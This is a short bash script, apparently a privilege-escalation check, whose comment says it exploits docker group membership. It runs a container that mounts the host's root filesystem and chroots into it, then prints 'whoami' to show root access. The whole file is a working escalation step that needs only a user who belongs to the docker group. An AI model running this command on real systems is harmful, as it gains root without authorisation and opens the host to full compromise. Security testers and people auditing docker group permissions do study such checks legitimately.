#!/usr/bin/env bash
set -e

# Exploit docker group: use docker run and chroot to escalate to root
docker run --rm -v /:/mnt alpine chroot /mnt whoami 2> /dev/null
